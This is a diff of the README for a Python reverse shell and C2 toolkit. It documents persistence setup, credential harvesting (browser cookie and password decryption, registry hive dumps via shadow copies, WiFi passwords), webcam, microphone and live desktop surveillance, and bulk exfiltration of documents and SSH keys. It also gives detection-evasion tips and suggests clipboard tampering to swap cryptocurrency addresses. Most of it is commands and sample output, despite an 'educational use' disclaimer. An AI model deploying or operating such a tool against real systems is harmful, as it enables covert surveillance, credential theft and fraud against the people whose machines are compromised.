@@ -4,123 +4,139 @@
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 [![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey)](https://github.com/yourusername/pyrevkit)
 
-A powerful, secure reverse shell toolkit with encrypted WebSocket communication, file transfer capabilities, media capture, advanced reconnaissance, and authentication system.
+[![WebSocket](https://img.shields.io/badge/protocol-WebSocket-blueviolet.svg)](https://websockets.readthedocs.io/)
+[![TLS/SSL](https://img.shields.io/badge/encryption-TLS%2FSSL-red.svg)](https://en.wikipedia.org/wiki/Transport_Layer_Security)
+[![Authentication](https://img.shields.io/badge/auth-PBKDF2--SHA256-orange.svg)](https://en.wikipedia.org/wiki/PBKDF2)
+
+[![Features](https://img.shields.io/badge/commands-40+-success.svg)](https://github.com/yourusername/pyrevkit#-features)
+[![Async](https://img.shields.io/badge/async-asyncio-blue.svg)](https://docs.python.org/3/library/asyncio.html)
+[![Cross-Platform](https://img.shields.io/badge/cross--platform-yes-success.svg)](https://github.com/yourusername/pyrevkit)
+
+**⚠️ Educational Purpose Only** - This tool is designed for authorized security testing and educational purposes. Use responsibly and only on systems you own or have explicit permission to test.
+
+**🎓 Research & Education** | **🔐 Security Testing** | **🛡️ Red Team Operations** | **📚 Learning Tool**
+
+---
+
+A powerful, feature-rich C2 framework with encrypted WebSocket communication, advanced credential harvesting, browser data extraction with decryption, desktop surveillance, VSS-based file access, and comprehensive reconnaissance capabilities.
 
 ## 🎯 Features
 
 ### Core Features
-- **🔐 Secure Communication**: TLS/SSL encrypted WebSocket connections
-- **🔑 Authentication**: PBKDF2-SHA256 hashed credentials with salting
-- **📁 File Transfer**: Bidirectional file upload/download with base64 encoding
-- **🔄 Auto-Reconnection**: Exponential backoff retry mechanism
-- **🎭 Persistent Targets**: Targets remain connected between operator sessions
-- **🤖 Autonomous Deployment**: Pre-configured credentials for silent deployment
-- **📊 Multi-Session**: Multiple operators can connect to the same target sequentially
-- **🛡️ Safe Execution**: Command timeout protection (30s default)
+- **Secure Communication**: TLS/SSL encrypted WebSocket connections
+- **Authentication**: PBKDF2-SHA256 hashed credentials with salting
+- **File Transfer**: Bidirectional file upload/download with base64 encoding
+- **Auto-Reconnection**: Exponential backoff retry mechanism
+- **Persistent Targets**: Targets remain connected between operator sessions
+- **Multi-Session Support**: Multiple operators can connect sequentially
+- **Safe Execution**: Command timeout protection (30s default)
 
-### Media Capture
-- **📸 Webcam Capture**: Take photos via target's webcam
-- **🎤 Audio Recording**: Record audio from target's microphone (1-300 seconds)
-- **💾 Automatic Storage**: All media saved in `loot/` directory
+### Desktop Surveillance
+- **Screenshot Capture**: Full-resolution desktop screenshots
+- **Live Desktop Streaming**: Real-time monitoring at ~5 FPS with concurrent command execution
+- **Webcam Capture**: Target webcam photo capture
+- **Audio Recording**: Microphone recording (1-300 seconds)
 
-### Advanced Reconnaissance
-- **🔍 File Search**: Search files by name pattern with customizable limits
-- **📝 Content Search**: Search inside text files for sensitive data
-- **📊 System Information**: Comprehensive system profiling (OS, hardware, network, storage)
-- **📋 Clipboard Access**: Read and write clipboard content on target machines
+### Browser Data Extraction with VSS
+- **History, Cookies, Bookmarks, Downloads**: Extract from Chrome, Edge, Firefox
+- **Automatic Cookie Decryption**: v10/v11/DPAPI decryption (seamless integration)
+- **VSS Integration**: Bypasses locked databases when browser is running
+- **Smart Fallback**: Direct copy → VSS fallback → automatic cleanup
+
+### Advanced Credential Harvesting
+- **Browser Password Decryption**: Edge/Chrome v10/v11 with v20 detection
+- **Registry Dump via VSS**: SAM/SYSTEM/SECURITY hives for offline hash extraction
+- **WiFi Credentials**: Saved wireless network passwords
+- **Windows Mail Export via VSS**: Complete email database extraction
+- **Application Credentials**: FileZilla, PuTTY, WinSCP enumeration
+
+### Smart File Operations
+- **Pattern-Based Exfiltration**: Documents, credentials, source code, custom patterns
+- **VSS File Access**: Access locked files via shadow copies
+- **Directory Listing**: Recursive file system exploration
+- **File Search**: Name and content-based searching
+
+### System Reconnaissance
+- **Enhanced System Info**: 10+ categories including uptime, privileges, users, groups, ports, security software, processes, domain info, VM detection, scheduled tasks
+- **Clipboard Access**: Read and write clipboard content
+- **Background Monitoring**: Autonomous clipboard history tracking
 
 ## 📋 Table of Contents
 
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Architecture](#architecture)
-- [Usage](#usage)
-  - [Server Setup](#server-setup)
-  - [Target Deployment](#target-deployment)
-  - [Client Connection](#client-connection)
-  - [File Transfer Commands](#file-transfer-commands)
-  - [Media Capture Commands](#media-capture-commands)
-  - [Reconnaissance Commands](#reconnaissance-commands)
-  - [Clipboard Commands](#clipboard-commands)
-- [Examples](#examples)
-- [Configuration](#configuration)
-- [Security Considerations](#security-considerations)
-- [Troubleshooting](#troubleshooting)
-- [Contributing](#contributing)
-- [License](#license)
+- [Installation](#-installation)
+- [Quick Start](#-quick-start)
+- [Architecture](#-architecture)
+- [Usage](#-usage)
+  - [Desktop Surveillance](#desktop-surveillance)
+  - [Browser Data Extraction](#browser-data-extraction)
+  - [Credential Harvesting](#credential-harvesting)
+  - [File Operations](#file-operations)
+  - [System Reconnaissance](#system-reconnaissance)
+- [VSS Integration](#-vss-integration)
+- [Cookie Decryption & v20 Limitations](#-cookie-decryption--v20-limitations)
+- [Examples](#-examples)
+- [Troubleshooting](#-troubleshooting)
+- [License](#-license)
 
 ## 🚀 Installation
 
-### Requirements
+### Requirements by Component
 
-**Core (Required):**
-- Python 3.7 or higher
-- `websockets` library
-
-**Optional (For Advanced Features):**
-- `opencv-python` - Webcam capture
-- `sounddevice`, `scipy`, `numpy` - Audio recording
-- `pyperclip` - Clipboard management
-
-### Linux / macOS
-
+#### **Server (C2 Server)**
 ```bash
-# Clone the repository
-git clone https://github.com/yourusername/pyrevkit.git
-cd pyrevkit
-
-# Install dependencies
-pip3 install websockets
-
-# Or using requirements.txt
-pip3 install -r requirements.txt
-
-# Optional: Install media capture dependencies
-pip3 install -r requirements-media.txt
-
-# Optional: Install all advanced features
-pip3 install -r requirements-advanced.txt
+pip install websockets
 
 # Generate SSL certificate
 openssl req -x509 -newkey rsa:4096 -nodes \
-  -out server.pem -keyout server.pem -days 365 \
-  -subj "/CN=YOUR_SERVER_IP"
+  -out server.pem -keyout server.pem -days 365
 ```
 
-### Windows
-
-```powershell
-# Clone the repository
-git clone https://github.com/yourusername/pyrevkit.git
-cd pyrevkit
-
-# Install dependencies
-pip install websockets
-
-# Or using requirements.txt
-pip install -r requirements.txt
-
-# Optional: Install media capture dependencies
-pip install -r requirements-media.txt
-
-# Optional: Install all advanced features
-pip install -r requirements-advanced.txt
-
-# Generate SSL certificate (requires OpenSSL for Windows)
-openssl req -x509 -newkey rsa:4096 -nodes -out server.pem -keyout server.pem -days 365
-```
-
-### Docker (Optional)
-
+#### **Client (Operator Console)**
 ```bash
-docker build -t pyrevkit .
-docker run -d -p 8765:8765 --name pyrevkit-server pyrevkit
+pip install websockets
 ```
+
+#### **Target (Compromised Machine)**
+
+**Core (Required):**
+```bash
+pip install websockets
+```
+
+**Optional (Enhanced Features):**
+```bash
+# Browser cookie/password decryption (v10/v11)
+pip install pycryptodome pywin32
+
+# Screenshots & desktop streaming
+pip install mss pillow
+
+# Media capture
+pip install opencv-python sounddevice scipy numpy
+
+# Clipboard access
+pip install pyperclip
+```
+
+### Dependency Matrix
+
+| Feature | Required Libraries | Notes |
+|---------|-------------------|-------|
+| **Core C2** | websockets | All components |
+| **Screenshots/Streaming** | mss, pillow | Target only |
+| **Cookie/Password Decryption** | pycryptodome, pywin32 | Target only, v10/v11 support |
+| **Webcam** | opencv-python | Target only |
+| **Audio Recording** | sounddevice, scipy, numpy | Target only |
+| **Clipboard** | pyperclip | Target only, GUI required |
+
+**Key Points:**
+- ✅ VSS features require **Administrator privileges** on target
+- ✅ v20 cookie decryption is **not possible** (documented below)
+- ✅ Most features work with just `websockets` installed
 
 ## ⚡ Quick Start
 
 ### 1. Setup Credentials
-
 ```bash
 # Add operator credentials
 python pyrev_server.py -creds operator admin SecurePassword123!
@@ -130,964 +146,493 @@ python pyrev_server.py -creds target machineA TargetPassword456!
 ```
 
 ### 2. Start the Server
-
 ```bash
 python pyrev_server.py
 ```
 
-Output:
-```
-[+] Directories ready: loot/, payloads/
-[+] Server running on wss://0.0.0.0:8765
-[+] Credentials file: credentials.json
-[+] Loot directory: loot/
-[+] Payloads directory: payloads/
-```
-
 ### 3. Connect a Target
-
 ```bash
 python pyrev_target.py
 ```
 
-Interactive mode:
-```
-Server host [192.168.2.110]: 
-Server port [8765]: 
---- Authentication ---
-Login: machineA
-Password: [hidden]
-[+] Connected and authenticated. Waiting for commands...
-```
-
 ### 4. Connect as Operator
-
 ```bash
 python pyrev_client.py
 ```
 
-```
---- Authentication ---
-Login: admin
-Password: [hidden]
-[+] Connected to server
-Target ID: machineA
-[+] Interactive session started
->>> whoami
-root
->>> 
+### 5. Start Using
+```bash
+>>> targets
+1. DESKTOP-ABC123 (192.168.1.100) - Windows 10
+
+>>> connect 1
+>>> sysinfo
+>>> browser cookies --save
+>>> screenshot
 ```
 
 ## 🏗️ Architecture
 
 ```
-┌─────────────────┐         ┌────────────────┐         ┌────────────────┐
-│     Operator    │         │   C2 Server    │         │     Target     │
-│                 │◄───────►│   - Auth       │◄───────►│                |
-│                 │  WSS    │   - Relay      │  WSS    │                │
-│  pyrev_client   │         │   - Files      │         │  pyrev_target  │
-└─────────────────┘         │                │         └────────────────┘
-                            |  pyrev_server  |
-                            └────────────────┘
+┌─────────────────┐
+│  Operator(s)    │ ◄─── TLS/WSS ───┐
+│  (Client)       │                  │
+└─────────────────┘                  │
                                      │
-                              ┌──────┴──────┐
-                              │             │
-                            loot/       payloads/
+         ┌──────────────────────────▼┐
+         │    C2 Server               │
+         │  - Message Routing         │
+         │  - Authentication          │
+         │  - Target Management       │
+         └──────────────────────────┬─┘
+                                    │
+                           TLS/WSS  │
+                                    │
+         ┌──────────────────────────▼┐
+         │    Target(s)               │
+         │  - Command Execution       │
+         │  - VSS Operations          │
+         │  - Browser Extraction      │
+         │  - Credential Harvesting   │
+         └────────────────────────────┘
 ```
 
-### Components
+## 💻 Usage
 
-- **pyrev_server.py**: Central C2 server handling authentication, relay, and file operations
-- **pyrev_client.py**: Operator interface for sending commands and managing files
-- **pyrev_target.py**: Agent deployed on target machines
-
-### File Structure
-
-```
-pyrevkit/
-├── pyrev_server.py          # C2 Server
-├── pyrev_client.py          # Operator client
-├── pyrev_target.py          # Target agent
-├── requirements.txt         # Python dependencies
-├── server.pem              # SSL certificate (generated)
-├── credentials.json        # Hashed credentials (auto-created)
-├── loot/                   # Downloaded files from targets
-└── payloads/               # Files to upload to targets
-```
-
-## 📖 Usage
-
-### Server Setup
-
-#### Start Server
+### Desktop Surveillance
 
 ```bash
-python pyrev_server.py [OPTIONS]
+# Screenshot
+screenshot                    # Capture single screenshot → loot/target_screenshot_TIMESTAMP.png
+
+# Desktop Streaming (concurrent commands supported)
+stream_start                 # Start live desktop stream (~5 FPS)
+stream_stop                  # Stop stream → loot/target_stream_frame_N.jpg
+
+# Webcam
+webcam                       # Capture webcam photo → loot/target_webcam_TIMESTAMP.jpg
+
+# Audio
+record 30                    # Record 30 seconds of audio → downloads/audio_TIMESTAMP.wav
 ```
 
-**Options:**
-- `-creds ROLE LOGIN PASSWORD` - Add/update credentials
-- `-host HOST` - Server host (default: 0.0.0.0)
-- `-port PORT` - Server port (default: 8765)
-- `-cert FILE` - SSL certificate file (default: server.pem)
-
-**Examples:**
+### Browser Data Extraction
 
 ```bash
-# Add operator
-python pyrev_server.py -creds operator alice MyPass123
+# History
+browser history              # Show first 50 entries
+browser history --save       # Save all to file → downloads/browser_history_TIMESTAMP.txt
 
-# Add target
-python pyrev_server.py -creds target prod-web-01 TargetPass456
+# Cookies (automatic v10/v11 decryption, VSS if locked)
+browser cookies              # Show first 50 cookies with decryption attempt
+browser cookies --save       # Save ALL cookies with decryption
+                            # → downloads/browser_cookies_TIMESTAMP.txt
+                            # ✅ No LIMIT - saves everything
+                            # ✅ Automatic decryption integrated
+                            # ✅ Uses VSS if database locked
+                            # ❌ v20 shows as [v20 App-Bound]
 
-# Start on custom port
-python pyrev_server.py -host 0.0.0.0 -port 9000
+# Bookmarks
+browser bookmarks            # Show first 50 bookmarks
+browser bookmarks --save     # Save all to file
+
+# Downloads
+browser downloads            # Show first 50 downloads
+browser downloads --save     # Save all to file
 ```
 
-#### Credential Management
+**VSS Behavior for Browser Data:**
+1. Attempts direct copy of database
+2. If locked (browser running) → Creates VSS snapshot
+3. Accesses database from shadow copy
+4. Extracts and decrypts data
+5. Automatic cleanup (deletes shadow)
 
-Credentials are stored in `credentials.json` with PBKDF2-SHA256 hashing:
-
-```json
-{
-  "operator": {
-    "admin": {
-      "hash": "0b2ad92a1f3e68487a780b3c6d7ab33c...",
-      "salt": "e48cbd452e38b9337130dcb82f3b761c..."
-    }
-  },
-  "target": {
-    "machineA": {
-      "hash": "f61a20f536c15913156a282b3eb84b03...",
-      "salt": "ff789cd49679ebadd2f60b02094ae21b..."
-    }
-  }
-}
-```
-
-### Target Deployment
-
-#### Interactive Mode
+### Credential Harvesting
 
 ```bash
-python pyrev_target.py
+# Browser Passwords (with v10/v11/v20 detection)
+creds edge_decrypt           # Decrypt Edge passwords
+                            # ✅ v10/v11: Shows decrypted passwords
+                            # ❌ v20: Shows [v20 App-Bound] + export instructions
+
+creds chrome_decrypt         # Decrypt Chrome passwords
+
+# Registry Dump via VSS (requires Admin)
+creds registry_dump_vss      # Dump SAM/SYSTEM/SECURITY hives via VSS
+                            # → downloads/registry_dump_TIMESTAMP.zip
+                            #
+                            # Extract offline with:
+                            # secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# WiFi Credentials
+creds wifi                   # Dump saved WiFi passwords
+
+# Credential Enumeration
+creds browsers               # List browser credential locations
+creds applications           # FTP, SSH, database credentials
 ```
 
-The script will prompt for:
-- Server host
-- Server port
-- Login credentials
+**VSS Registry Dump Workflow:**
+1. Creates VSS snapshot of system drive
+2. Copies registry hives from shadow:
+   - `C:\Windows\System32\config\SAM`
+   - `C:\Windows\System32\config\SYSTEM`
+   - `C:\Windows\System32\config\SECURITY`
+3. Creates ZIP archive
+4. Automatic cleanup
 
-#### Autonomous Mode (Silent Deployment)
-
-Edit the configuration section in `pyrev_target.py`:
-
-```python
-# ========== CONFIGURATION ==========
-TARGET_ID = "machineA"
-SERVER_HOST = "192.168.2.110"
-SERVER_PORT = 8765
-
-AUTO_LOGIN = "machineA"           # Fill for auto-connect
-AUTO_PASSWORD = "TargetPass456"   # Fill for auto-connect
-# ====================================
-```
-
-Then simply run:
+### Windows Mail Export
 
 ```bash
-python pyrev_target.py
+msg windows_mail_export      # Export Windows Mail database via VSS
+                            # → downloads/windows_mail_export_TIMESTAMP.zip
+                            # ✅ Uses VSS to bypass locks
+                            # ✅ Works with Mail app running
+                            #
+                            # To read exported data:
+                            # 1. Download ESEDatabaseView (nirsoft.net)
+                            # 2. Extract ZIP
+                            # 3. Open store.vol with ESEDatabaseView
+                            # 4. Browse tables: Message, Folder, Contact
 ```
 
-Output:
-```
-[+] Auto-connecting to 192.168.2.110:8765 as machineA
-[+] Connected and authenticated. Waiting for commands...
-```
-
-**Persistence Examples:**
-
-Linux (systemd):
-```bash
-sudo nano /etc/systemd/system/pyrevkit.service
-```
-
-```ini
-[Unit]
-Description=PyRevKit Agent
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=/usr/bin/python3 /opt/pyrevkit/pyrev_target.py
-Restart=always
-User=nobody
-
-[Install]
-WantedBy=multi-user.target
-```
+### File Operations
 
 ```bash
-sudo systemctl enable pyrevkit
-sudo systemctl start pyrevkit
+# Smart Exfiltration
+exfil documents              # Find and exfil documents (docx, pdf, xlsx, etc.)
+exfil credentials            # Find credential files (kdbx, json, pem, etc.)
+exfil code                   # Find source code files
+exfil custom *.log           # Custom pattern search
+
+# File Transfer
+download <filename>          # Download from target's downloads/
+upload <filename>            # Upload from payloads/ to target
+ls_downloads                 # List available downloads
+
+# Directory Operations
+ls <path>                    # List directory contents
+pwd                          # Show current directory
+cd <path>                    # Change directory
+
+# File Search
+search *.pdf --limit 100     # Search by filename pattern
+search --content "password"  # Search file contents
 ```
 
-Windows (Startup):
-```batch
-# Add to: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\pyrevkit.bat
-@echo off
-cd C:\Tools\pyrevkit
-python pyrev_target.py
-```
-
-### Client Connection
+### System Reconnaissance
 
 ```bash
-python pyrev_client.py
+# System Information
+sysinfo                      # Comprehensive system info:
+                            # - OS, architecture, uptime
+                            # - Admin/root status
+                            # - All users & groups
+                            # - Listening ports
+                            # - Security software (AV/Firewall/UAC)
+                            # - Running processes
+                            # - Installed software
+                            # - Domain information
+                            # - VM detection
+                            # - Scheduled tasks
+
+# Clipboard
+clipboard                    # Read clipboard content
+clipboard_write "text"       # Write to clipboard
+clipboard_monitor start      # Background monitoring
+clipboard_monitor status     # Check monitoring status
+clipboard_monitor stop       # Stop monitoring
+clipboard_history            # View captured history
+
+# Shell Commands
+<command>                    # Execute any shell command
 ```
 
-**Session Flow:**
+## 🛡️ VSS Integration
 
-1. Enter server connection details
-2. Authenticate with operator credentials
-3. Specify target ID to connect to
-4. Interactive command prompt
+PyRevKit uses **Volume Shadow Copy Service (VSS)** to bypass file locks and access in-use databases/files.
 
+### VSS-Enabled Features
+
+| Feature | Command | When VSS is Used |
+|---------|---------|------------------|
+| **Browser Cookies** | `browser cookies [--save]` | Database locked (browser running) |
+| **Windows Mail** | `msg windows_mail_export` | Mail app is running |
+| **Registry Dump** | `creds registry_dump_vss` | Always (to bypass locks) |
+
+### How VSS Works
+
+**Technical Implementation:**
+- **Method**: PowerShell WMI (`Win32_ShadowCopy`)
+- **Platform**: Windows 10/11
+- **Requirements**: Administrator privileges
+- **Cleanup**: Automatic (no traces left)
+
+**Workflow:**
 ```
->>> help
+1. Create VSS snapshot: PowerShell WMI Win32_ShadowCopy.Create()
+2. Parse shadow path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN
+3. Create symbolic link: mklink /D
+4. Copy files from shadow
+5. Extract data
+6. Cleanup: Delete shadow + symlink
 ```
 
-### File Transfer Commands
+### OPSEC Considerations
 
-#### Download Files from Target
+**✅ Benefits:**
+- Bypasses file locks (works with apps running)
+- Looks like legitimate backup operation
+- No direct process interaction needed
+
+**⚠️ Detection Risks:**
+- VSS operations logged in Windows Event Logs (Event ID 8222, 8224)
+- EDR/AV may monitor VSS API calls
+- SIEM may alert on unusual VSS patterns
+- Requires Admin privileges (elevation may be logged)
+
+**Recommendations:**
+- Use VSS features strategically (not excessively)
+- Time operations during business hours/high activity
+- Monitor target's security posture before use
+- Consider alternative methods when stealth is critical
+
+## 🍪 Cookie Decryption & v20 Limitations
+
+### Encryption Version Support
+
+| Version | Encryption Method | Decryption Support | Status |
+|---------|------------------|-------------------|--------|
+| **v10** | AES-256-GCM | ✅ **Full Support** | Uses master key from Local State |
+| **v11** | AES-256-GCM | ✅ **Full Support** | Same as v10 |
+| **v20** | App-Bound Encryption | ❌ **Cannot Decrypt** | Service-managed, hardware-backed |
+| **DPAPI** | Windows DPAPI | ✅ **Full Support** | Legacy encryption |
+| **Plaintext** | None | ✅ **Direct Read** | Some cookies stored unencrypted |
+
+### Understanding v20 App-Bound Encryption
+
+**What is v20?**
+- Introduced in Edge 119+ and Chrome 127+
+- Uses Windows App-Bound Encryption service
+- Keys are hardware-backed and service-managed
+- **Cannot be extracted programmatically**
+
+**Why Can't We Decrypt v20?**
+```
+Browser GUI (works):
+├── Reads encrypted_value from database
+├── Calls Windows App-Bound Service
+├── Service decrypts with hardware key
+└── Shows: "decrypted_cookie_value"
+
+PyRevKit (fails):
+├── Reads encrypted_value from database
+├── Tries to decrypt with master key
+└── FAILS: v20 requires privileged service
+```
+
+**Detection in Output:**
+```
+1. .google.com - SID
+   Value: [v20 App-Bound]
+   Expires: 13450064202354117
+```
+
+### Workarounds for v20 Cookies
+
+Since v20 cannot be decrypted, use these alternatives:
+
+**Option 1: Browser DevTools**
+```
+1. Open Edge/Chrome → F12 (DevTools)
+2. Application tab → Cookies
+3. Right-click → Export as JSON/cURL
+```
+
+**Option 2: Browser Extensions**
+```
+Install: EditThisCookie or Cookie-Editor
+- Export → JSON format
+- Cookies exported decrypted
+```
+
+**Option 3: JavaScript Console**
+```javascript
+// F12 → Console
+document.cookie.split(';').forEach(c => console.log(c.trim()));
+```
+
+**Option 4: Older Browser Versions**
+- Edge < 119 or Chrome < 127
+- Still use v10/v11 (can be decrypted)
+
+### Automatic Decryption Behavior
+
+Cookie decryption is **seamlessly integrated** - no flags needed:
 
 ```bash
->>> download /etc/passwd
-[*] Requesting download: /etc/passwd
-[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
+browser cookies              # Automatic decryption attempt
+browser cookies --save       # Automatic decryption + save all
 ```
 
-**Features:**
-- Automatic renaming with target prefix
-- Size display
-- Max file size: 10MB
-- Supports absolute and relative paths
-
-#### Upload Files to Target
-
-```bash
->>> upload exploit.sh
-[*] Uploading: exploit.sh
-[✓] Saved exploit.sh (5.67 KB) → downloads/exploit.sh
-```
-
-Files are uploaded from the server's `payloads/` directory to the target's `downloads/` folder.
-
-#### List Files
-
-```bash
-# List downloaded files (server-side)
->>> ls_loot
-Files in loot/:
-  - machineA_passwd (2.45 KB)
-  - machineA_config.txt (1.23 KB)
-
-# List available payloads
->>> ls_payloads
-Files in payloads/:
-  - exploit.sh (5.67 KB)
-  - payload.exe (234.56 KB)
-```
-
-### Media Capture Commands
-
-#### Webcam Capture
-
-Capture photos from the target's webcam:
-
-```bash
->>> webcam
-[*] Capturing webcam...
-[✓] Webcam captured (156.78 KB) → loot/machineA_webcam_20260403_143022.jpg
-```
-
-**Features:**
-- JPEG format
-- Native webcam resolution
-- Automatic timestamped naming
-- Saved to `loot/` directory
+**What Happens:**
+1. ✅ **Plaintext cookies** → Shown as-is
+2. ✅ **v10/v11 encrypted** → Decrypted and shown
+3. ✅ **DPAPI encrypted** → Decrypted and shown
+4. ❌ **v20 encrypted** → Shows `[v20 App-Bound]`
 
 **Requirements:**
-- Target must have `opencv-python` installed: `pip install opencv-python`
-- Webcam must be accessible (not used by another application)
-
-#### Audio Recording
-
-Record audio from the target's microphone:
-
 ```bash
->>> record 30
-[*] Recording 30 seconds of audio...
-[✓] Audio recorded (5.05 MB) → loot/machineA_audio_20260403_143522.wav
+pip install pycryptodome pywin32
 ```
 
-**Parameters:**
-- Duration: 1 to 300 seconds (5 minutes max)
-- Format: WAV, 44.1kHz, 16-bit, stereo
-- Approximate size: ~170 KB per second
+## 📊 Examples
 
-**Examples:**
+### Example 1: Complete Cookie Extraction
+
 ```bash
->>> record 10      # 10 seconds (~1.7 MB)
->>> record 60      # 1 minute (~10 MB)
->>> record 300     # 5 minutes (max, ~50 MB)
+>>> connect 1
+
+# Extract and save all cookies (automatic decryption)
+>>> browser cookies --save
+
+# Output:
+═══ EDGE ═══
+Entries Found: 50 (showing first 50)
+
+Filename: browser_cookies_20260405_232500.txt
+Total Entries: 537    # All cookies, not limited to 100
+Size: 256.72 KB
+
+# Download
+>>> download browser_cookies_20260405_232500.txt
+
+# File contains:
+# - v10/v11 cookies: Decrypted values
+# - v20 cookies: [v20 App-Bound]
+# - Plaintext cookies: Original values
 ```
 
-**Requirements:**
-- Target must have audio libraries installed:
-  ```bash
-  pip install sounddevice scipy numpy
-  ```
-
-### Reconnaissance Commands
-
-#### File Search
-
-Search for files by name pattern:
+### Example 2: Registry Credential Dump
 
 ```bash
->>> search *.pdf
-[*] Searching for files: *.pdf
-[✓] Found 15 results:
-  1. C:\Users\John\Documents\report.pdf (523.45 KB)
-  2. C:\Users\John\Desktop\invoice.pdf (102.34 KB)
-  ...
+>>> creds registry_dump_vss
+
+# Output:
+╔════════════════════════════════════════════════════╗
+║  REGISTRY HIVES DUMPED VIA VSS                     ║
+╚════════════════════════════════════════════════════╝
+
+Method: Volume Shadow Copy (VSS)
+Hives Dumped: SAM, SYSTEM, SECURITY
+Total Hives: 3/3
+
+Filename: registry_dump_20260405_193045.zip
+ZIP Size: 8.12 MB
+
+>>> download registry_dump_20260405_193045.zip
+
+# On attacker machine:
+$ unzip registry_dump_20260405_193045.zip
+$ secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+# Output: NTLM hashes
+Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+User1:1001:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
 ```
 
-**With custom limit:**
-```bash
->>> search *.pem --limit 200
-[*] Searching for files: *.pem (limit: 200)
-[✓] Found 79 results:
-  1. /home/user/cert1.pem (5.61 KB)
-  ...
-  79. /home/user/cert79.pem (3.24 KB)
-```
-
-**Supported patterns:**
-- `*.pdf` - All PDF files
-- `*.docx` - All Word documents
-- `password*` - Files starting with "password"
-- `*config*` - Files containing "config"
-- `secret.txt` - Specific file
-
-**Default limit:** 100 results (use `--limit N` to customize)
-
-#### Content Search
-
-Search inside text files for sensitive data:
+### Example 3: Desktop Surveillance
 
 ```bash
->>> search --content "password"
-[*] Searching for content: password
-[✓] Found 8 results:
-  1. C:\config.txt:45
-     database_password=admin123
-  2. C:\Users\John\notes.txt:12
-     Remember to change password next week
-  ...
-```
+# Start streaming (concurrent commands work)
+>>> stream_start
+[*] Desktop stream started
 
-**With custom limit:**
-```bash
->>> search --content "api_key" --limit 300
-[*] Searching for content: api_key (limit: 300)
-[✓] Found 45 results:
-  1. /app/config.json:23
-     "api_key": "sk_live_abc123..."
-  ...
-```
-
-**Supported file types:**
-- Text files: `.txt`, `.log`, `.conf`, `.config`, `.ini`
-- Code files: `.py`, `.sh`, `.bat`, `.cmd`
-- Data files: `.xml`, `.json`
-
-**Limitations:**
-- Max file size: 10MB per file
-- Text files only (binary files skipped)
-
-#### System Information
-
-Gather comprehensive system information:
-
-```bash
+# Continue working while streaming
 >>> sysinfo
-[*] Gathering system information...
-[✓] System Information - machineA
+[output shown normally]
 
-System:
-  os: Windows
-  os_version: 10.0.19045
-  os_release: 10
-  hostname: DESKTOP-ABC123
-  architecture: AMD64
-  processor: Intel64 Family 6 Model 158 Stepping 10
-  python_version: 3.11.0
+>>> browser history
+[output shown normally]
 
-User:
-  username: admin
-  home: C:\Users\admin
+# Frames save automatically
+[STREAM] Frame 10 (74.7 KB) → loot\target_stream_frame_10.jpg
+[STREAM] Frame 20 (76.2 KB) → loot\target_stream_frame_20.jpg
 
-Network:
-  hostname: DESKTOP-ABC123
-  local_ip: 192.168.1.100
-
-Storage:
-  C: 120.5GB free / 512.0GB total
-  D: 50.2GB free / 1024.0GB total
-
-Environment:
-  PATH: C:\Windows\system32;C:\Windows;...
-  TEMP: C:\Users\admin\AppData\Local\Temp
+>>> stream_stop
+[*] Desktop stream stopped
 ```
 
-**Information collected:**
-- Operating system details
-- Hardware specifications
-- Current user and home directory
-- Network configuration
-- Storage/disk space
-- Environment variables
-
-**No additional dependencies required** - uses Python standard library only.
-
-### Clipboard Commands
-
-#### Read Clipboard
-
-Capture clipboard content from the target:
+### Example 4: Smart File Exfiltration
 
 ```bash
->>> clipboard
-[*] Reading clipboard...
-[✓] Clipboard content:
-MySecretPassword123!
+# Find credential files
+>>> exfil credentials
+
+# Output:
+Found 3 credential files:
+1. C:\Users\User\Documents\passwords.kdbx (2.1 MB)
+2. C:\Users\User\.ssh\id_rsa (1.7 KB)
+3. C:\Users\User\AppData\Roaming\FileZilla\sitemanager.xml (4.3 KB)
+
+Saved to: downloads/exfil_credentials_20260405_194500.zip
 ```
-
-**Use cases:**
-- Capture copied passwords
-- Intercept copied credentials
-- Monitor user activity
-- Capture API keys and tokens
-
-#### Write Clipboard
-
-Inject content into the target's clipboard:
-
-```bash
->>> clipboard set "Hello from operator"
-[*] Setting clipboard...
-[✓] Clipboard updated
-```
-
-**Use cases:**
-- Replace cryptocurrency addresses
-- Inject phishing URLs
-- Modify copied commands
-- Social engineering attacks
-
-**Requirements:**
-- Target must have `pyperclip` installed: `pip install pyperclip`
-- Graphical environment required (not headless servers)
-- **Linux:** Requires `xclip` or `xsel`:
-  ```bash
-  sudo apt-get install xclip
-
-
-#### All Available Commands
-
-| Command | Description | Example |
-|---------|-------------|---------|
-| **Basic Commands** |
-| `<command>` | Execute shell command | `whoami`, `ls -la` |
-| `help` | Show help message | `help` |
-| `exit` / `quit` | Disconnect from target | `exit` |
-| **File Transfer** |
-| `download <file>` | Download file from target | `download /etc/shadow` |
-| `upload <file>` | Upload file to target | `upload payload.exe` |
-| `ls_loot` | List downloaded files | `ls_loot` |
-| `ls_payloads` | List available payloads | `ls_payloads` |
-| **Media Capture** |
-| `webcam` | Capture photo via webcam | `webcam` |
-| `record <seconds>` | Record audio (1-300s) | `record 30` |
-| **Reconnaissance** |
-| `search <pattern>` | Search files by name | `search *.pdf` |
-| `search <pattern> --limit <N>` | Search with custom limit | `search *.log --limit 500` |
-| `search --content <text>` | Search file contents | `search --content "password"` |
-| `search --content <text> --limit <N>` | Content search with limit | `search --content "api" --limit 200` |
-| `sysinfo` | Gather system information | `sysinfo` |
-| **Clipboard** |
-| `clipboard` | Read clipboard content | `clipboard` |
-| `clipboard set <text>` | Set clipboard content | `clipboard set "payload"` |
-
-## 💡 Examples
-
-### Example 1: Basic Reconnaissance
-
-```bash
->>> whoami
-root
-
->>> uname -a
-Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux
-
->>> pwd
-/root
-
->>> ls -la
